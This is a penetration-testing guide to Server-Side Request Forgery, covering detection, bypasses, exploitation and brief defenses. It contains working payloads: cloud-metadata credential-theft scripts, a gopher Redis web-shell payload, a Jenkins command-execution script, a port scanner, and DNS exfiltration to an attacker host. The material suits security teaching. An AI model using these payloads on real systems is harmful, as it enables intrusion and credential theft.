# Server-Side Request Forgery (SSRF): A Comprehensive Technical Guide

## Introduction

Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows attackers to induce server-side applications to make HTTP requests to an arbitrary domain chosen by the attacker. By leveraging SSRF vulnerabilities, attackers can force applications to connect to unexpected destinations, potentially bypassing network security measures like firewalls and VPNs that would normally prevent such connections.

This guide focuses on practical aspects of SSRF - how to identify these vulnerabilities during penetration testing, what methodologies to use for successful exploitation, and understanding the potential impact across different environments.

## Understanding SSRF Vulnerabilities

### Core Mechanics

At its most basic level, SSRF occurs when an application fetches a remote resource without properly validating the user-supplied URL. The application acts as a proxy, sending requests on behalf of the attacker to:

- Internal services behind firewalls
- Cloud service provider metadata endpoints
- External systems
- The vulnerable server itself (via loopback addresses)

### Common SSRF Scenarios

SSRF vulnerabilities typically arise in these contexts:

1. **Remote resource integration** - Applications that fetch URLs, validate documents, or process data from external sources
2. **Webhook functionality** - Features that send HTTP callbacks to user-defined URLs
3. **Document processors** - PDF generators, image processors, or data conversion tools
4. **HTTP-based API integrations** - Applications connecting to third-party services
5. **Proxy or redirect services** - Code that forwards requests to other servers

## SSRF Detection Methodology

### Manual Testing Approaches

#### 1. Identify URL Input Parameters

Start by identifying parameters that might influence server-side HTTP requests:

- URL parameters and paths (`url=`, `path=`, `uri=`, `document=`, etc.)
- JSON/XML fields in API requests that contain URLs
- File upload functionality that processes remote content
- Webhook configuration interfaces
- Proxy or redirect functionality

#### 2. Inspect Request Behavior

Submit test payloads and observe application behavior:

```
https://vulnerable-app.com/fetch?url=https://attacker-controlled-domain.com/ssrf-probe
```

Set up a server at `attacker-controlled-domain.com` to detect incoming connections. Use tools like [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Interactsh](https://github.com/projectdiscovery/interactsh) to catch out-of-band connections.

#### 3. Test for Internal Access

Try accessing internal resources:

```
https://vulnerable-app.com/fetch?url=http://localhost/
https://vulnerable-app.com/fetch?url=http://127.0.0.1/
https://vulnerable-app.com/fetch?url=http://10.0.0.1/
https://vulnerable-app.com/fetch?url=http://172.16.0.1/
https://vulnerable-app.com/fetch?url=http://192.168.1.1/
```

#### 4. Test Non-HTTP Protocols

Attempt to use other protocols to identify cross-protocol attacks:

```
https://vulnerable-app.com/fetch?url=file:///etc/passwd
https://vulnerable-app.com/fetch?url=dict://internal-service:11211/stats
https://vulnerable-app.com/fetch?url=gopher://internal-redis:6379/_FLUSHALL%0D%0ASET%20mykey%20%22Hello%20SSRF%22%0D%0AQUIT
```

### Automated Testing Techniques

#### Using Specialized SSRF Tools

Several tools can assist in SSRF detection:

1. **SSRFmap**: [SSRFmap](https://github.com/swisskyrepo/SSRFmap) automates SSRF exploitation across various services

```bash
python ssrfmap.py -r original_request.txt -p url -m redis
```

2. **Gopherus**: Generate [Gopherus](https://github.com/tarunkant/Gopherus) payloads for specific services:

```bash
gopherus --exploit mysql
```

#### Burp Suite SSRF Detection

Configure Burp Suite for effective SSRF testing:

1. Use the Burp Collaborator client to generate unique external domains
2. Configure scan rules to test specifically for SSRF patterns
3. Use Burp's active scanner with SSRF-specific profiles

```
# Example Burp Intruder payload positions
GET /api/fetch?url=§http://collaborator-payload.burpcollaborator.net§ HTTP/1.1
Host: vulnerable-app.com
```

### Cloud Environment Testing Considerations

When testing for SSRF in cloud environments, specifically target cloud metadata endpoints:

#### AWS

```
https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### Azure

```
https://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/instance
https://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/instance/compute?api-version=2021-01-01&format=json
```

#### Google Cloud Platform

```
https://vulnerable-app.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/
https://vulnerable-app.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Remember to add appropriate headers for certain cloud providers:
- For Azure: `Metadata: true`
- For GCP: `Metadata-Flavor: Google`

## Bypassing SSRF Protections

### Obfuscation Techniques

When basic SSRF protections are in place, try these bypass techniques:

#### 1. IP Address Obfuscation

Convert IPs to decimal, octal, or hexadecimal formats:

```
# Different ways to represent 127.0.0.1
http://2130706433/
http://0x7f000001/
http://017700000001/
http://0177.0.0.01/
```

#### 2. Domain Obfuscation

Use DNS records to hide the target:

```
# Create a DNS record pointing to internal IP
http://internal-service.attacker.com/ # Points to 192.168.0.1
```

#### 3. URL Encoding

Apply single or double URL encoding:

```
# Single URL encoding
https://vulnerable-app.com/fetch?url=http://127.0.0.1/%2561dmin

# Double URL encoding
https://vulnerable-app.com/fetch?url=http://127.0.0.1/%252561dmin
```

#### 4. Using URL Fragments

```
https://vulnerable-app.com/fetch?url=https://safe-domain.com#http://malicious-domain.com
```

#### 5. Abusing Redirects

Chain a redirect through a legitimate domain:

```python
# Flask redirect server example
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirect_to_internal():
    return redirect("http://internal-service:8080/", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

Then:
```
https://vulnerable-app.com/fetch?url=https://attacker-controlled-domain.com/redirect
```

### Bypassing Blocklists

When specific strings or patterns are blocked:

1. **Case manipulation**: `hTTp://LocALhost/`
2. **Nested encoding**: `http://127.0.0.1/%2561dmin`
3. **Using alternative localhost names**: `http://localhost.localdomain/` or `http://loopback/`
4. **Using IPv6**: `http://[::1]/admin`
5. **Using enclosed alphanumerics**: `http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/`

### Bypassing Allowlisting

When only certain domains are allowed:

1. **Subdomain exploitation**: If `example.com` is allowed, try `internal.example.com.attacker.com`
2. **Path traversal in URL**: `https://allowed-domain.com@malicious-domain.com`
3. **Credentials in URL**: `https://allowed-domain.com:password@malicious-domain.com`
4. **Open redirects**: Find an open redirect on the allowed domain

```
https://vulnerable-app.com/fetch?url=https://allowed-domain.com/redirect?url=http://internal-service/
```

## Advanced SSRF Exploitation Examples

### Accessing Internal Services

#### Targeting Internal Web Interfaces

```python
# Using Python requests to simulate a SSRF attack against Elasticsearch
import requests

# The vulnerable endpoint
url = "https://vulnerable-app.com/proxy"

# Target the internal Elasticsearch instance
payload = {"url": "http://localhost:9200/_cat/indices"}

r = requests.post(url, json=payload)
print(r.text)  # This might reveal all Elasticsearch indices
```

#### Exploiting Docker Metadata Service

```
https://vulnerable-app.com/fetch?url=http://169.254.170.2/v2/metadata
```

### Cloud Infrastructure Attacks

#### AWS IAM Credential Theft

```python
import requests

# The vulnerable endpoint
target = "https://vulnerable-app.com/proxy"

# Step 1: List available IAM roles
r1 = requests.post(target, json={
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
})
role_name = r1.text.strip()

# Step 2: Get the credentials for the identified role
r2 = requests.post(target, json={
    "url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
})

print(r2.text)  # This contains AccessKeyId, SecretAccessKey, and Token
```

#### Exploiting Google Cloud Service Accounts

```bash
# Request chain to access Google Cloud service account tokens
VULN_URL="https://vulnerable-app.com/fetch?url="

# 1. Get list of service accounts 
curl "$VULN_URL=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  -H "Metadata-Flavor: Google"

# 2. Get OAuth token for default service account
curl "$VULN_URL=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

### SSRF to Remote Code Execution

#### Attacking Redis via Gopher Protocol

```
# Redis RCE via configured webshell
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

When URL-encoded and injected into a vulnerable parameter:

```
https://vulnerable-app.com/fetch?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

This payload:
1. Flushes Redis database
2. Sets a key with PHP code content
3. Configures Redis to save its DB file in the web root
4. Names the file shell.php
5. Saves the database, creating a web shell

#### Attacking Jenkins Script Console

```python
import requests
import urllib.parse

# Target vulnerable application
target = "https://vulnerable-app.com/proxy"

# Jenkins groovy script to execute commands
jenkins_payload = """
def cmd = "id"
def process = cmd.execute()
println("Output: " + process.text)
"""

# First, get the Jenkins crumb for CSRF protection (if needed)
# (Simplified - actual implementation might need cookie handling)
crumb_response = requests.post(target, json={
    "url": "http://internal-jenkins:8080/crumbIssuer/api/json"
})
crumb_data = crumb_response.json()
crumb = crumb_data.get("crumb")

# Build the form data for the script console
form_data = {
    "script": jenkins_payload,
    "Jenkins-Crumb": crumb
}

# Encode the form data for proper transmission
encoded_data = "&".join([f"{k}={urllib.parse.quote(v)}" for k, v in form_data.items()])

# Use SSRF to hit the Jenkins script console
ssrf_payload = {
    "url": f"http://internal-jenkins:8080/scriptText",
    "method": "POST",
    "data": encoded_data,
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
    }
}

# Execute the attack
response = requests.post(target, json=ssrf_payload)
print(response.text)
```

## Blind SSRF Techniques

### Detection Methods for Blind SSRF

When direct output isn't visible, use these techniques:

1. **Time-based detection**:
   
```python
import requests
import time

# Vulnerable endpoint
target = "https://vulnerable-app.com/webhook-config"

# Test with a slow responding endpoint
start_time = time.time()
requests.post(target, json={
    "webhook_url": "http://attacker.com/delay?sleep=5000"
})
end_time = time.time()

# If response time > 5 seconds, likely vulnerable to SSRF
print(f"Response time: {end_time - start_time} seconds")
```

2. **DNS-based detection**:

```
# Generate a unique subdomain for each test
https://vulnerable-app.com/fetch?url=http://unique-id.burpcollaborator.net
```

Then check DNS logs for incoming queries to verify the SSRF.

3. **Error-based inference**:

Test invalid ports or services and observe different error messages:

```
https://vulnerable-app.com/fetch?url=http://internal-service:22/
https://vulnerable-app.com/fetch?url=http://internal-service:3306/
```

If error messages differ between valid and invalid services, you can map the internal network.

## Impact of SSRF Vulnerabilities

### Internal Network Mapping

SSRF can be used to perform port scanning and service discovery:

```python
import requests
import concurrent.futures

def check_port(port):
    try:
        response = requests.get(
            f"https://vulnerable-app.com/fetch",
            params={"url": f"http://internal-network:{port}/"},
            timeout=1
        )
        # Different status codes or response times can indicate open ports
        return port, response.status_code, len(response.text)
    except requests.exceptions.RequestException:
        return port, "error", 0

# Scan common ports
ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200]

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(check_port, ports))

for port, status, length in results:
    print(f"Port {port}: Status {status}, Response length {length}")
```

### Data Exfiltration

SSRF can be used to extract sensitive information:

```python
# Example of data exfiltration via DNS
def exfiltrate_via_dns(data):
    encoded_data = base64.b64encode(data.encode()).decode()
    chunks = [encoded_data[i:i+30] for i in range(0, len(encoded_data), 30)]
    
    for i, chunk in enumerate(chunks):
        dns_query = f"{i}-{chunk}.exfil.attacker.com"
        requests.get(
            "https://vulnerable-app.com/fetch",
            params={"url": f"http://{dns_query}/"}
        )
```

### Access Control Bypass

SSRF can bypass network-level restrictions:

```
# Access admin interface only available to localhost
https://vulnerable-app.com/fetch?url=http://localhost:8080/admin
```

## Defending Against SSRF

### Input Validation Practices

Implement strict input validation:

```python
# Python example of URL validation
import re
import urllib.parse

def is_safe_url(url):
    # Parse the URL
    parsed = urllib.parse.urlparse(url)
    
    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Validate hostname - no internal IPs
    hostname = parsed.netloc.split(':')[0]
    if hostname in ['localhost', '127.0.0.1'] or hostname.startswith('192.168.') or hostname.startswith('10.'):
        return False
    
    # Validate against IP address pattern
    ip_pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
    ip_match = re.match(ip_pattern, hostname)
    if ip_match:
        # Check for private IP ranges
        octets = [int(octet) for octet in ip_match.groups()]
        if (octets[0] == 127 or
            octets[0] == 10 or
            (octets[0] == 172 and 16 <= octets[1] <= 31) or
            (octets[0] == 192 and octets[1] == 168)):
            return False
    
    return True
```

### Architecture-Level Protections

Implement network-level controls:

```bash
# Example iptables rules to block outbound connections from web server to metadata services
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

### Use of Allowlisting

Implement domain allowlisting:

```python
# Java example using URL allowlist
private static final Set<String> ALLOWED_DOMAINS = Set.of(
    "api.trusted-service.com",
    "cdn.trusted-service.com",
    "partner-api.com"
);

public boolean isUrlAllowed(String urlString) {
    try {
        URL url = new URL(urlString);
        String host = url.getHost();
        
        // Only allow specific domains
        return ALLOWED_DOMAINS.contains(host);
    } catch (MalformedURLException e) {
        return false;
    }
}
```

## Conclusion

SSRF vulnerabilities continue to be a critical threat in modern web applications, especially as cloud infrastructure becomes more prevalent. Effective detection requires a methodical approach to identifying potential injection points, and successful exploitation often involves creative bypassing of security controls.

For defenders, a defense-in-depth approach is essential, combining proper input validation, architectural safeguards, and runtime protections. Regular penetration testing with specific focus on SSRF vulnerabilities should be part of any comprehensive security program, particularly for applications deployed in cloud environments where the potential impact is significantly higher.

Penetration testers should keep abreast of new SSRF techniques and cloud service provider metadata endpoints, as these evolve over time and present new opportunities for exploitation.
